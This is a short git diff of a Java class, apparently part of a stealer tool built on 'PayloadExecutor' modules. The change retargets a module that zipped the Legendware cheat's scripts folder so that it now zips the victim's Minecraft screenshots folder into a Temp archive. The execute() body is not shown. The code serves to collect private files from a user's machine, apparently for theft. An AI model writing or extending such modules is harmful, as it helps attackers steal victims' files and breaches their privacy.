@@ -8,17 +8,18 @@ import org.zeroturnaround.zip.ZipUtil;
 import java.io.File;
 import java.util.Optional;
 
+import static org.zeroturnaround.zip.ZipUtil.*;
+
 /**
  * @author Peter
- * @since 09/13/2022
- * Gets Legendware's script folder(since it uses configs from the cloud).
+ * @since 10/09/2022
+ * Gets Minecraft screenshots' folder.
  */
-
-public class LegendwareScripts implements PayloadExecutor {
+public class MCScreenshots implements PayloadExecutor {
     Main main = new Main();
 
-    String path = System.getProperty("user.home") + "\\AppData\\Roaming\\Legendware\\Scripts";
-    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\oofLegend.zip";
+    String path = System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\screenshots";
+    String zipPath = System.getProperty("user.home") + "\\AppData\\Local\\Temp\\MCScreenshots.zip";
 
     @Override
     public void execute() throws Exception {
